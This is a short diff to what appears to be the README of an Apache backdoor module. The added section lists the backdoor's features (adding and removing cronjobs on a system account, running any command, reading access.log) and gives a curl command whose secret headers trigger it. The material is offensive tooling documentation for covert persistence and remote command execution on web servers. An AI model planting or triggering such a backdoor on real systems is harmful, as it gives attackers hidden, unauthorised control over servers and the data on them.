@@ -25,6 +25,15 @@ rm /etc/apache2/mods-available/backdoor.load
 ```
 Once again you will need to restart the apache2 service. 
 
+### Multiple Features 
+- Add cronjob to system account
+- Removes A cronjob from system
+- Run any command
+- Read access.log file
+
+```
+sudo curl -H "sourpatchkids: sourpatchkids" -H "API-Key: cronjob" http://localhost
+```
 
 # Sources
 
